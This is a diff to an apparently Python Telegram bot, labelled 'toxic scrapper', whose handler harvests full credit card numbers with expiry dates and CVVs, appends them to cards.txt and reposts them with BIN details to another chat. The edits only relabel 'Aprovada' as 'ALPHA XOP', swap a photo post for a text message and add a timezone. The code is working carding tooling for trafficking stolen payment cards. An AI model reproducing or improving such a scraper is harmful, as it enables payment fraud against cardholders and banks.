@@ -55,13 +55,15 @@ async def my_event_handler(client, message):
     bin_json = bin.json()
     fullinfo = f"{cc}|{mes}|{ano}|{cvv}"
     # print(f'{cc}|{mes}|{ano}|{cvv}')
-    print(f'{cc}|{mes}|{ano}|{cvv} - Aprovada [a+]')
+    print(f'{cc}|{mes}|{ano}|{cvv} - ALPHA XOP [a+]')
     with open('cards.txt', 'a') as w:
         w.write(fullinfo + '\n')
-    await client.send_photo(
+#    await client.send_photo(
+    await client.send_message(
         chat_id=SEND_ID,
 #        photo='heart4youu.jpg',
-        caption=f"""
+#        caption=f"""
+        text=f"""
 ══════════════════════
                 тσχιᴄ ѕᴄяαρρєя    
 ══════════════════════
@@ -79,7 +81,7 @@ async def my_event_handler(client, message):
 **• ᴇxᴛʀᴀ ➻**
   ⤷ `{extra}xxxx|{mes}|{ano}|{cvv}` 
 **━━━━━━━━━━━━━━━━━━━**
-**Time:** `{current_time}`
+**Time:** `{current_time}` (IST)
 """,
 )
 
